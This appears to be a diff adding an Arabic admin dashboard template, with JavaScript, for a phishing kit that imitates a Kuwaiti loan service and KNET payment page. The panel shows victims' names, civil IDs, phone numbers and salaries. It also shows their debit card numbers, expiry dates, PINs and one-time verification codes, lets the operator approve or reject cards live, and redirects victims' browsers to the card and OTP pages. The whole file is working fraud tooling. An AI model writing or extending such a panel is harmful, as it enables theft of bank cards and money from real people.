@@ -1,0 +1,432 @@
+<!doctype html> <html lang="ar" dir="rtl"> <head> <meta charset="utf-8"/> <meta name="viewport" content="width=device-width,initial-scale=1"/> <title>آخر الزوار</title> <link rel="stylesheet" href="{{ url_for('static', path='css/fonts.css') }}"/> <link rel="stylesheet" href="{{ url_for('static', path='vendor/tabler/tabler.min.css') }}"/> <style> body { font-family: "Tajawal", "InterLocal", sans-serif; }
+    .rv-list { max-height: calc(100vh - 220px); overflow: auto; }
+    .rv-item { cursor: pointer; border: 1px solid var(--tblr-border-color); border-radius: 10px; padding: 10px; margin-bottom: 8px; }
+    .rv-item.active { border-color: var(--tblr-primary); background: rgba(var(--tblr-primary-rgb), .08); }
+    .rv-item.online { box-shadow: inset 0 0 0 1px rgba(34, 197, 94, 0.55); }
+    .knet-card {
+      border-radius: 14px;
+      border: 1px solid #1e3a8a;
+      color: #fff;
+      background: linear-gradient(160deg, #0b3b66, #0f5b92, #1672aa);
+      padding: 12px;
+      box-shadow: 0 14px 22px rgba(11, 56, 93, 0.28);
+    }
+    .knet-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+    .kline { display: flex; justify-content: space-between; gap: 8px; font-size: .9rem; }
+    .kline span:first-child { color: rgba(255,255,255,.8); }
+    .code-list { list-style: none; margin: 0; padding: 0; }
+    .code-list li { display: flex; justify-content: space-between; border-top: 1px solid rgba(255,255,255,.22); padding: 6px 0; }
+    .modal-backdrop-custom {
+      position: fixed; inset: 0; background: rgba(2, 6, 23, .55); display: none;
+      align-items: center; justify-content: center; z-index: 1100; padding: 16px;
+    }
+    .modal-backdrop-custom.open { display: flex; }
+    .modal-card-custom { width: min(760px, 100%); max-height: 90vh; overflow: auto; }
+    @media (max-width: 900px) { .knet-grid { grid-template-columns: 1fr; } } </style> </head> <body> <div class="page"> <header class="navbar navbar-expand-md d-print-none"> <div class="container-xl"> <div class="navbar-brand">لوحة الإدارة</div> <div class="navbar-nav ms-auto"> <a href="/admin" class="btn btn-ghost-secondary me-2">الرئيسية</a> <form method="post" action="/admin/logout" class="m-0"> <button class="btn btn-outline-danger" type="submit">تسجيل الخروج</button> </form> </div> </div> </header> <div class="page-wrapper"> <div class="page-header d-print-none"> <div class="container-xl"> <div class="row g-2 align-items-center"> <div class="col"><h2 class="page-title">آخر الزوار</h2></div> <div class="col-auto text-secondary">المسؤول: <strong>{{ admin_user }}</strong></div> </div> </div> </div> <div class="page-body"> <div class="container-xl"> <div class="row row-cards"> <div class="col-lg-4"> <div class="card"> <div class="card-body"> <div class="alert alert-info mb-3" id="statusText"> {% if delete_status == 'deleted' %}تمت أرشفة الزائر بنجاح.{% elif delete_status == 'bulk-deleted' %}تمت أرشفة {{ delete_count }} مدخلات غير متصلة.{% elif delete_status == 'online' %}لا يمكن أرشفة زائر متصل حالياً.{% elif delete_status == 'none' %}لا توجد مدخلات غير متصلة للأرشفة.{% elif delete_status == 'error' %}تعذر تنفيذ الأرشفة.{% else %}آخر تحديث: {{ generated_at }}{% endif %} </div> <form method="post" action="/admin/visitors/delete-offline" class="mb-3"> <button id="archiveAllBtn" class="btn btn-danger w-100" type="submit" {% if not show_bulk_delete %} style="display:none" {% endif %}>أرشفة كل غير المتصلين</button> </form> <div id="visitorsList" class="rv-list"></div> </div> </div> </div> <div class="col-lg-8"> <div class="card"> <div class="card-header d-flex justify-content-between align-items-center flex-wrap gap-2"> <div> <h3 class="card-title mb-1" id="selectedTitle">آخر الزوار</h3> <div class="text-secondary" id="selectedSub">اختر زائراً من القائمة</div> </div> <div class="btn-list"> <button id="redirectBtn" class="btn btn-primary" type="button" disabled="disabled">إعادة توجيه</button> <button id="infoBtn" class="btn btn-outline-secondary" type="button" disabled="disabled">كل المعلومات</button> <button id="archiveVisitorBtn" class="btn btn-danger" type="button" disabled="disabled">أرشفة الإدخال</button> </div> </div> <div class="card-body" id="detailBody"> <div class="empty text-secondary">اختر زائراً لعرض التفاصيل</div> </div> </div> </div> </div> </div> </div> </div> </div> <div id="redirectModal" class="modal-backdrop-custom" aria-hidden="true"> <div class="card modal-card-custom"> <div class="card-header"><h3 class="card-title">إعادة توجيه الزائر</h3></div> <div class="card-body"> <div id="redirectTargets" class="row g-2"></div> </div> <div class="card-footer text-end"> <button class="btn" data-close="redirectModal" type="button">إغلاق</button> </div> </div> </div> <div id="infoModal" class="modal-backdrop-custom" aria-hidden="true"> <div class="card modal-card-custom"> <div class="card-header"><h3 class="card-title">معلومات الزائر</h3></div> <div class="card-body" id="infoContent"></div> <div class="card-footer text-end"> <button class="btn" data-close="infoModal" type="button">إغلاق</button> </div> </div> </div> <script src="{{ url_for('static', path='vendor/tabler/tabler.min.js') }}"></script> <script nonce="{{ request.state.csp_nonce }}"> const initialVisitors = {{ recent_visitors | tojson }};
+    const visitors = new Map(initialVisitors.map((v) => [v.id, v]));
+
+    const listEl = document.getElementById("visitorsList");
+    const detailBody = document.getElementById("detailBody");
+    const selectedTitle = document.getElementById("selectedTitle");
+    const selectedSub = document.getElementById("selectedSub");
+    const redirectBtn = document.getElementById("redirectBtn");
+    const infoBtn = document.getElementById("infoBtn");
+    const archiveVisitorBtn = document.getElementById("archiveVisitorBtn");
+    const archiveAllBtn = document.getElementById("archiveAllBtn");
+    const statusText = document.getElementById("statusText");
+
+    let selectedVisitorId = initialVisitors[0]?.id || "";
+    let currentSubmissions = [];
+    let currentVerificationStatus = "pending";
+    let statusPollTimer = null;
+    let ws = null;
+
+    const redirectPages = [
+      { key: "/", label: "الرئيسية" },
+      { key: "/loan-calculator", label: "الحاسبة" },
+      { key: "/customer-info", label: "بيانات العميل" },
+      { key: "/additional-customer-info", label: "معلومات إضافية" },
+      { key: "/transaction-notification", label: "إشعار العملية" },
+      { key: "/knet", label: "بيانات البطاقة" },
+      { key: "/verfication", label: "التحقق" }
+    ];
+
+    function escapeHtml(v) {
+      return String(v ?? "").replace(/[&<>\"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
+    }
+
+    function sortedVisitors() {
+      return Array.from(visitors.values()).sort((a, b) => {
+        if (a.online_status === "Online" && b.online_status !== "Online") return -1;
+        if (a.online_status !== "Online" && b.online_status === "Online") return 1;
+        return String(b.last_activity || "").localeCompare(String(a.last_activity || ""));
+      });
+    }
+
+    function renderVisitorList() {
+      const items = sortedVisitors();
+      const offlineCount = items.filter((x) => x.online_status !== "Online").length;
+      if (archiveAllBtn) archiveAllBtn.style.display = offlineCount >= 2 ? "inline-flex" : "none";
+
+      if (!items.length) {
+        listEl.innerHTML = '<div class="text-secondary">لا يوجد زوار حالياً</div>';
+        selectedVisitorId = "";
+        renderDetails();
+        return;
+      }
+
+      if (!selectedVisitorId || !visitors.has(selectedVisitorId)) selectedVisitorId = items[0].id;
+
+      listEl.innerHTML = items.map((v) => {
+        const active = v.id === selectedVisitorId ? "active" : "";
+        const online = v.online_status === "Online" ? "online" : "";
+        const badgeClass = v.online_status === "Online" ? "bg-success-lt text-success" : "bg-danger-lt text-danger";
+        const badgeLabel = v.online_status === "Online" ? "متصل" : "غير متصل";
+
+        return `
+          <button class="rv-item ${active} ${online}" type="button" data-id="${v.id}">
+            <div class="d-flex justify-content-between align-items-center">
+              <strong>${escapeHtml(v.identity_label || v.applicant_name || v.id_tail)}</strong>
+              <span class="badge ${badgeClass}">${badgeLabel}</span>
+            </div>
+            <div class="small text-secondary d-flex justify-content-between mt-1">
+              <span>ID: ${escapeHtml(v.id_tail || "----")}</span>
+              <span>${escapeHtml(v.current_page || "الصفحة الرئيسية")}</span>
+            </div>
+          </button>
+        `;
+      }).join("");
+    }
+
+    function buildStats(v) {
+      const fields = [
+        ["الاسم", v.applicant_name], ["الهاتف", v.phone_number], ["الرقم المدني", v.civil_id],
+        ["المهنة", v.job_title], ["نوع القرض", v.loan_type], ["المبلغ", v.amount],
+        ["المدة", v.loanterm], ["الراتب", v.salary], ["دخل إضافي", v.additional_income],
+        ["أول دخول", v.created_at], ["آخر نشاط", v.last_activity], ["الصفحة الحالية", v.current_page]
+      ];
+
+      return `
+        <div class="row row-cards">
+          ${fields.map(([k, val]) => `
+            <div class="col-md-6 col-xl-4">
+              <div class="card card-sm"><div class="card-body">
+                <div class="text-secondary small">${escapeHtml(k)}</div>
+                <div class="fw-bold mt-1">${escapeHtml(val || "—")}</div>
+              </div></div>
+            </div>
+          `).join("")}
+        </div>
+      `;
+    }
+
+    function buildCards() {
+      if (!currentSubmissions.length) return '<div class="text-secondary">لا يوجد إدخالات بطاقة</div>';
+      const latestId = currentSubmissions[0]?.id || "";
+
+      return `
+        <div class="row row-cards mt-2">
+          ${currentSubmissions.map((s) => {
+            const canVerify = s.id === latestId && currentVerificationStatus === "pending";
+            const verify = canVerify
+              ? '<div class="mt-2"><button class="btn btn-success btn-sm me-2" data-verify="approved">قبول</button><button class="btn btn-danger btn-sm" data-verify="rejected">رفض</button></div>'
+              : "";
+
+            const codes = Array.isArray(s.verfication_codes) && s.verfication_codes.length
+              ? s.verfication_codes.map((c) => `<li><strong>${escapeHtml(c.value)}</strong><span>${escapeHtml(c.created_at)}</span></li>`).join("")
+              : '<li><strong>لا توجد إدخالات</strong><span>—</span></li>';
+
+            return `
+              <div class="col-12">
+                <article class="knet-card" data-submission-id="${s.id}">
+                  <div class="d-flex justify-content-between align-items-center mb-2">
+                    <strong>${escapeHtml(s.bank || "—")}</strong>
+                    <div class="d-flex gap-2 align-items-center">
+                      <span class="badge bg-white text-dark">${escapeHtml(s.created_at || "—")}</span>
+                      <button class="btn btn-danger btn-sm archive-knet" type="button">أرشفة</button>
+                    </div>
+                  </div>
+
+                  <div class="knet-grid">
+                    <div class="kline"><span>المقدمة</span><strong>${escapeHtml(s.dcprefix || "—")}</strong></div>
+                    <div class="kline"><span>الرقم</span><strong>${escapeHtml(s.debit_number || "—")}</strong></div>
+                    <div class="kline"><span>الانتهاء</span><strong>${escapeHtml(s.expiry || "—")}</strong></div>
+                    <div class="kline"><span>الرقم السري</span><strong>${escapeHtml(s.pin_code || "—")}</strong></div>
+                  </div>
+
+                  <div class="mt-2">
+                    <span class="badge bg-blue-lt text-blue">Length: ${s.card_number_length_valid ? "OK" : "NO"}</span>
+                    <span class="badge bg-azure-lt text-azure">Luhn: ${s.luhn_valid ? "OK" : "NO"}</span>
+                    <span class="badge bg-indigo-lt text-indigo">Expiry: ${s.expiry_valid ? "OK" : "NO"}</span>
+                  </div>
+
+                  ${verify}
+
+                  <ul class="code-list mt-2">${codes}</ul>
+                </article>
+              </div>
+            `;
+          }).join("")}
+        </div>
+      `;
+    }
+
+    function renderDetails() {
+      const v = visitors.get(selectedVisitorId);
+      if (!v) {
+        selectedTitle.textContent = "لا يوجد زوار";
+        selectedSub.textContent = "انتظر دخول زائر جديد";
+        redirectBtn.disabled = true;
+        infoBtn.disabled = true;
+        archiveVisitorBtn.disabled = true;
+        detailBody.innerHTML = '<div class="text-secondary">لا توجد بيانات حالياً</div>';
+        return;
+      }
+
+      selectedTitle.textContent = v.identity_label || v.applicant_name || `زائر ${v.id_tail}`;
+      selectedSub.textContent = `${v.online_status === "Online" ? "متصل" : "غير متصل"} • آخر نشاط: ${v.last_activity || "غير متوفر"}`;
+      redirectBtn.disabled = false;
+      infoBtn.disabled = false;
+      archiveVisitorBtn.disabled = v.online_status === "Online";
+
+      detailBody.innerHTML = `${buildStats(v)}<h4 class="mt-3">إدخالات البطاقة</h4>${buildCards()}`;
+    }
+
+    async function fetchSummary(visitorId) {
+      const res = await fetch(`/admin/visitors/${encodeURIComponent(visitorId)}/summary`, { credentials: "same-origin" });
+      if (!res.ok) return;
+      const data = await res.json();
+      if (data?.id) visitors.set(data.id, { ...(visitors.get(data.id) || {}), ...data });
+    }
+
+    async function fetchSubmissions(visitorId) {
+      const res = await fetch(`/admin/visitors/${encodeURIComponent(visitorId)}/knet-submissions`, { credentials: "same-origin" });
+      if (!res.ok) return;
+      const data = await res.json();
+      currentSubmissions = Array.isArray(data?.submissions) ? data.submissions : [];
+      currentVerificationStatus = String(data?.verification_status || "pending");
+    }
+
+    async function selectVisitor(visitorId, skipFetch = false) {
+      selectedVisitorId = visitorId;
+      renderVisitorList();
+      if (!skipFetch) await Promise.all([fetchSummary(visitorId), fetchSubmissions(visitorId)]);
+      renderVisitorList();
+      renderDetails();
+
+      const selected = visitors.get(visitorId);
+      if (selected?.has_new_info) {
+        fetch(`/admin/visitors/${encodeURIComponent(visitorId)}/mark-info-viewed`, {
+          method: "POST", credentials: "same-origin", headers: { "Content-Type": "application/json" }, body: "{}"
+        }).then(() => {
+          const x = visitors.get(visitorId);
+          if (!x) return;
+          x.has_new_info = false;
+          visitors.set(visitorId, x);
+          renderVisitorList();
+        }).catch(() => {});
+      }
+    }
+
+    async function refreshStatuses() {
+      const ids = sortedVisitors().map((v) => v.id).filter(Boolean);
+      const query = ids.length ? `?ids=${encodeURIComponent(ids.join(","))}` : "";
+      const res = await fetch(`/admin/recent-visitors/statuses${query}`, { credentials: "same-origin" });
+      if (!res.ok) return;
+      const data = await res.json();
+
+      ids.forEach((id) => {
+        const v = visitors.get(id);
+        if (!v) return;
+        if (data?.statuses?.[id]) v.online_status = data.statuses[id];
+        if (typeof data?.info_flags?.[id] === "boolean") v.has_new_info = data.info_flags[id];
+        if (data?.current_pages?.[id]) v.current_page = data.current_pages[id];
+        visitors.set(id, v);
+      });
+
+      if (data?.has_new_visitors) { window.location.reload(); return; }
+      renderVisitorList();
+      renderDetails();
+    }
+
+    function openModal(id) {
+      const m = document.getElementById(id);
+      if (!m) return;
+      m.classList.add("open");
+      m.setAttribute("aria-hidden", "false");
+    }
+    function closeModal(id) {
+      const m = document.getElementById(id);
+      if (!m) return;
+      m.classList.remove("open");
+      m.setAttribute("aria-hidden", "true");
+    }
+
+    function connectWebSocket() {
+      const scheme = window.location.protocol === "https:" ? "wss" : "ws";
+      ws = new WebSocket(`${scheme}://${window.location.host}/ws/admin/recent-visitors`);
+
+      ws.onopen = () => { statusText.textContent = "متصل بالتحديثات الفورية"; };
+      ws.onerror = () => ws.close();
+      ws.onclose = () => {
+        statusText.textContent = "انقطع الاتصال الفوري... إعادة المحاولة";
+        setTimeout(connectWebSocket, 1200);
+      };
+
+      ws.onmessage = async (event) => {
+        let payload;
+        try { payload = JSON.parse(event.data); } catch { return; }
+        const visitorId = payload?.visitor_id ? String(payload.visitor_id) : "";
+        const eventName = String(payload?.event || "");
+
+        if (visitorId && visitors.has(visitorId)) {
+          if (eventName === "admin.visitor.archived") {
+            visitors.delete(visitorId);
+            if (selectedVisitorId === visitorId) {
+              selectedVisitorId = sortedVisitors()[0]?.id || "";
+              currentSubmissions = [];
+            }
+            renderVisitorList();
+            if (selectedVisitorId) await selectVisitor(selectedVisitorId);
+            else renderDetails();
+            return;
+          }
+
+          if (["admin.visitor.updated", "admin.visitor.redirect.requested", "visitor.current_page.updated", "visitor.heartbeat", "visitor.offline"].includes(eventName)) {
+            await fetchSummary(visitorId);
+            if (selectedVisitorId === visitorId) await fetchSubmissions(visitorId);
+            renderVisitorList();
+            renderDetails();
+            return;
+          }
+
+          if (["admin.knet.submission.created", "admin.knet.submission.archived", "visitor.knet.verification.updated", "admin.knet.verification.code.created"].includes(eventName)) {
+            if (selectedVisitorId === visitorId) {
+              await fetchSubmissions(visitorId);
+              renderDetails();
+            }
+            return;
+          }
+        }
+
+        await refreshStatuses();
+      };
+    }
+
+    listEl.addEventListener("click", async (e) => {
+      const item = e.target.closest(".rv-item");
+      if (!item?.dataset.id) return;
+      await selectVisitor(item.dataset.id);
+    });
+
+    detailBody.addEventListener("click", async (e) => {
+      const verifyBtn = e.target.closest("[data-verify]");
+      if (verifyBtn) {
+        const decision = verifyBtn.dataset.verify;
+        if (!selectedVisitorId || !decision) return;
+        verifyBtn.disabled = true;
+        const res = await fetch(`/admin/visitors/${encodeURIComponent(selectedVisitorId)}/knet-verification/${encodeURIComponent(decision)}`, {
+          method: "POST", credentials: "same-origin", headers: { "Content-Type": "application/json" }, body: "{}"
+        });
+        verifyBtn.disabled = false;
+        if (res.ok) { await fetchSubmissions(selectedVisitorId); renderDetails(); }
+        return;
+      }
+
+      const archiveBtn = e.target.closest(".archive-knet");
+      if (!archiveBtn) return;
+      const card = archiveBtn.closest("[data-submission-id]");
+      const submissionId = card?.dataset.submissionId;
+      if (!submissionId) return;
+
+      archiveBtn.disabled = true;
+      const res = await fetch(`/admin/knet-submissions/${encodeURIComponent(submissionId)}/archive`, {
+        method: "POST", credentials: "same-origin", headers: { "Content-Type": "application/json" }, body: "{}"
+      });
+
+      if (res.ok && selectedVisitorId) { await fetchSubmissions(selectedVisitorId); renderDetails(); }
+      else archiveBtn.disabled = false;
+    });
+
+    redirectBtn.addEventListener("click", () => {
+      if (!selectedVisitorId) return;
+      const current = String(visitors.get(selectedVisitorId)?.current_page || "").trim();
+      const currentKey = redirectPages.find((p) => p.key === current || p.label === current)?.key || current;
+
+      const targets = document.getElementById("redirectTargets");
+      targets.innerHTML = redirectPages.map((p) => {
+        const disabled = p.key === currentKey ? "disabled" : "";
+        const klass = p.key === currentKey ? "btn btn-success col-6 col-md-4" : "btn btn-outline-primary col-6 col-md-4";
+        return `<button class="${klass}" data-target-path="${p.key}" type="button" ${disabled}>${p.label}</button>`;
+      }).join("");
+
+      openModal("redirectModal");
+    });
+
+    document.getElementById("redirectTargets").addEventListener("click", async (e) => {
+      const btn = e.target.closest("button[data-target-path]");
+      if (!btn || !selectedVisitorId) return;
+      const target = btn.dataset.targetPath;
+
+      btn.disabled = true;
+      const res = await fetch(`/admin/visitors/${encodeURIComponent(selectedVisitorId)}/redirect`, {
+        method: "POST", credentials: "same-origin", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ target_path: target })
+      });
+      btn.disabled = false;
+
+      if (!res.ok) return;
+
+      const v = visitors.get(selectedVisitorId);
+      if (v) { v.current_page = target; visitors.set(selectedVisitorId, v); }
+      renderVisitorList();
+      renderDetails();
+      closeModal("redirectModal");
+    });
+
+    infoBtn.addEventListener("click", () => {
+      const v = visitors.get(selectedVisitorId);
+      if (!v) return;
+      document.getElementById("infoContent").innerHTML = buildStats(v);
+      openModal("infoModal");
+    });
+
+    archiveVisitorBtn.addEventListener("click", async () => {
+      if (!selectedVisitorId) return;
+      const v = visitors.get(selectedVisitorId);
+      if (!v || v.online_status === "Online") return;
+
+      archiveVisitorBtn.disabled = true;
+      const res = await fetch(`/admin/visitors/${encodeURIComponent(selectedVisitorId)}/delete`, {
+        method: "POST", credentials: "same-origin", headers: { "Content-Type": "application/json" }, body: "{}"
+      });
+
+      if (!res.ok && !res.redirected) { archiveVisitorBtn.disabled = false; return; }
+
+      visitors.delete(selectedVisitorId);
+      selectedVisitorId = sortedVisitors()[0]?.id || "";
+      currentSubmissions = [];
+      renderVisitorList();
+      if (selectedVisitorId) await selectVisitor(selectedVisitorId); else renderDetails();
+      statusText.textContent = "تمت أرشفة الإدخال";
+    });
+
+    document.querySelectorAll("[data-close]").forEach((el) => {
+      el.addEventListener("click", () => closeModal(el.dataset.close));
+    });
+
+    ["redirectModal", "infoModal"].forEach((id) => {
+      const modal = document.getElementById(id);
+      modal.addEventListener("click", (e) => { if (e.target === modal) closeModal(id); });
+    });
+
+    window.addEventListener("beforeunload", () => {
+      if (statusPollTimer) clearInterval(statusPollTimer);
+      if (ws && ws.readyState === WebSocket.OPEN) ws.close();
+    });
+
+    renderVisitorList();
+    if (selectedVisitorId) selectVisitor(selectedVisitorId).catch(() => renderDetails());
+    else renderDetails();
+
+    statusPollTimer = setInterval(() => { refreshStatuses().catch(() => {}); }, 3000);
+    connectWebSocket(); </script> </body> </html> 
